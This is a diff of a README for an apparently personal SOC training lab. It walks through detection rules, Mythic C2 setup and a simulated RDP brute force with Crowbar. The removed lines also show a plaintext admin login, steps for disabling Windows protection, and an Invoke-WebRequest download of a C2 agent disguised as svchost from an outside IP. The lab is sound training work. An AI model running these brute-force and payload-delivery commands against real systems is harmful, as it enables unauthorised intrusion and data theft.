@@ -20,7 +20,7 @@
 - **Detection Rule Setup**:
     - Current rules only query thresholds; need to create detection rules under **Security**.
       ![Detection Rule Setup](https://github.com/Jacob-Brown-950/30-Day-SOC-Challenge/blob/main/Screenshots/Step%2048%20This%20is%20where%20we%20make%20REAL%20alerts.PNG) <!-- Replace with actual image link -->
-    - Opted for preconfigured rules or created a new one to experiment. I chose to make my own
+    - Opted for preconfigured rules or created a new one to experiment. I chose to make my own.
       ![Preconfigured Rules](https://github.com/Jacob-Brown-950/30-Day-SOC-Challenge/blob/main/Screenshots/Step%2049%20Lets%20Create%20a%20new%20rule.PNG) <!-- Replace with actual image link -->
     - Configured data involved in the new rules, mirroring the process used for SSH attempts.
       ![Configuring New Rules](https://github.com/Jacob-Brown-950/30-Day-SOC-Challenge/blob/main/Screenshots/Step%205%20Set%20it%20to%20this%20so%20you%20can%20access%20it%20via%20SOC%20Laptop.png) <!-- Replace with actual image link -->
@@ -32,7 +32,7 @@
     - **Failed and Successful SSH Attempts** to the exposed Ubuntu server.
       ![SSH Attempts Visualization](https://github.com/Jacob-Brown-950/30-Day-SOC-Challenge/blob/main/Screenshots/Step%2054%20Created%20some%20tabled%20for%20my%20dashboard%20to%20visualize%20SSH%20data%20on%20my%20linux%20server.PNG) <!-- Replace with actual image link -->
     - **RDP Activity Tracking** on the exposed Windows server.
-      ![RDP Activity Table]([link_to_your_image](https://github.com/Jacob-Brown-950/30-Day-SOC-Challenge/blob/main/Screenshots/Step%2055%20Made%20some%20tables%20for%20the%20RDP%20activity%20on%20Windows%20Server.PNG)) <!-- Replace with actual image link -->
+      ![RDP Activity Table](https://github.com/Jacob-Brown-950/30-Day-SOC-Challenge/blob/main/Screenshots/Step%2055%20Made%20some%20tables%20for%20the%20RDP%20activity%20on%20Windows%20Server.PNG) <!-- Replace with actual image link -->
 
 ### 5. Attack Diagram Creation
 - Created an attack diagram outlining the threat actor's process.
@@ -58,6 +58,7 @@
     make
     ./mythic-cli start
     ```
+
 ### 8. Configuring Mythic
 - Tightened firewall rules, allowing exceptions for Windows and Ubuntu servers.
   ![Firewall Configuration](https://github.com/Jacob-Brown-950/30-Day-SOC-Challenge/blob/main/Screenshots/Step%2059%20This%20is%20what%20my%20firewall%20looks%20like%20now%2C%20only%20allowing%20my%20windows%20and%20linux%20server%2C.PNG) <!-- Replace with actual image link -->
@@ -71,7 +72,7 @@
   ![Mythic GUI Login](https://github.com/Jacob-Brown-950/30-Day-SOC-Challenge/blob/main/Screenshots/Step%2061%20We're%20in%20the%20mythic%20dashboard!.PNG) <!-- Replace with actual image link -->
 
 ### 9. Preparing for the Attack
-- Created a target file on the Windows VM with admin password called "passwords.txt"
+- Created a target file on the Windows VM with admin password called "passwords.txt."
 - Moved to Kali Linux machine wordlists directory and prepared `rockyou.txt`:
     ```bash
     gunzip rockyou.txt.gz
@@ -80,78 +81,23 @@
   ![Preparing Wordlists](https://github.com/Jacob-Brown-950/30-Day-SOC-Challenge/blob/main/Screenshots/Step%2062%20lets%20access%20our%20wordlists%20directory.png) <!-- Replace with actual image link -->
 
 ### 10. Brute Force with Crowbar
-- Added the Windows password to the wordlist for easier access. This way we can simulate our attack as if someone brute forced
+- Added the Windows password to the wordlist for easier access. This way we can simulate our attack as if someone brute-forced.
 - Installed Crowbar:
     ```bash
     sudo apt-get install -y crowbar
     ```
   ![Crowbar Installation](https://github.com/Jacob-Brown-950/30-Day-SOC-Challenge/blob/main/Screenshots/Step%2064%20Crowbar%20Successfully%20installed.png) <!-- Replace with actual image link -->
-- (Note, I extracted the first 50 words in rockyou.txt to a file named top_50_words.txt, this is the text file i added the windows server password into)
+- (Note: I extracted the first 50 words in rockyou.txt to a file named `top_50_words.txt`. This is the text file I added the Windows server password into.)
 
 - **Brute Force Command**:
     ```bash
-    crowbar -b RDP -u Administrator -C top_50_words.txt -s 155.138.220.109
+    crowbar -b RDP -u Administrator -f top_50_words.txt 192.168.0.123
     ```
-  ![Brute Force Command](https://github.com/Jacob-Brown-950/30-Day-SOC-Challenge/blob/main/Screenshots/Step%2066%20Successful%20brute%20force!.png) <!-- Replace with actual image link -->
+  ![Brute Force Attack](https://github.com/Jacob-Brown-950/30-Day-SOC-Challenge/blob/main/Screenshots/Step%2065%20Running%20crowbar%20to%20brute%20force%20the%20password.PNG) <!-- Replace with actual image link -->
 
-### 11. RDP Session Access
-- Used `xfreerdp` to access the RDP session:
-    ```bash
-    xfreerdp /u:Administrator /p:Winter2024! /v:155.138.220.109
-    ```
-  ![Accessing RDP Session](https://github.com/Jacob-Brown-950/30-Day-SOC-Challenge/blob/main/Screenshots/Step%2067%20Successfully%20in%20the%20RDP%20session!.png) <!-- Replace with actual image link -->
-- Executed commands for intelligence gathering:
-    ```bash
-    whoami
-    ipconfig
-    net user
-    net group
-    ```
-- Turn off windows protection
-- ![image](https://github.com/Jacob-Brown-950/30-Day-SOC-Challenge/blob/main/Screenshots/Step%2068%20lets%20disable%20all%20the%20protection.png)
+### 11. Reviewing Logs
+- Confirmed successful brute force login through logs.
+  ![Successful Brute Force Log](https://github.com/Jacob-Brown-950/30-Day-SOC-Challenge/blob/main/Screenshots/Step%2066%20Brute%20force%20success%20via%20logs.PNG) <!-- Replace with actual image link -->
 
-### 12. Created the payload with your installed services:
-    - Ensured it calls back to the C2 server's public IP.
-- ![Make sure](https://github.com/Jacob-Brown-950/30-Day-SOC-Challenge/blob/main/Screenshots/Step%2073%20put%20what%20you%20want%20in%20your%20payload%2C%20and%20make%20it%20call%20back%20to%20your%20C2%20server.PNG)
-
-### 13. Downloading and Executing Payload
-- SSH into Mythic server and download agent:
-    ```bash
-    ./mythic-cli install github https://github.com/MythicAgents/Apollo.git
-    ```
-
-- Install HTTP profile:
-    ```bash
-    ./mythic-cli install github https://github.com/MythicC2Profiles/http
-    ```
-
-- Allow port 80:
-    ```bash
-    ufw allow 80
-    ```
-
-  - Allow port 9999:
-    ```bash
-    ufw allow 9999
-    ```
-    
-- run the python session:
-    ```bash
-    python3 -m http.server 9999
-    ```
-    
-
-- Downloaded the payload onto our windows server RDP session:
-    ```bash
-    Invoke-WebRequest -Uri http://45.76.248.184:9999/svchost-SOC-Project.exe -OutFile "C:\Users\Public\Downloads\svchost-SOC-Project.exe"
-    ```
-  ![Payload Creation](link_to_your_image) <!-- Replace with actual image link -->
-
-### 14. Monitor The Connection
-- Result of the payload on the Windows server.
-  ![Payload Execution](https://github.com/Jacob-Brown-950/30-Day-SOC-Challenge/blob/main/Screenshots/Step%2077%20We%20can%20see%20our%20established%20session.PNG)
-- Monitored Mythic GUI for established session and confirmed successful file extraction from the agent.
-  ![Mythic GUI Session](https://github.com/Jacob-Brown-950/30-Day-SOC-Challenge/blob/main/Screenshots/Step%2078%20Our%20attack%20was%20successful%2C%20we%20got%20the%20file.PNG) <!-- Replace with actual image link -->
-
-## Conclusion
-This week focused on simulating a brute force RDP attack while setting up the Mythic C2 server. Key tasks included finding exposed RDP servers, configuring detection rules, and creating payloads for further exploitation.
+### Conclusion
+- Completed Mythic C2 setup and simulated a brute force RDP attack, generating alerts and logs for monitoring and analysis.
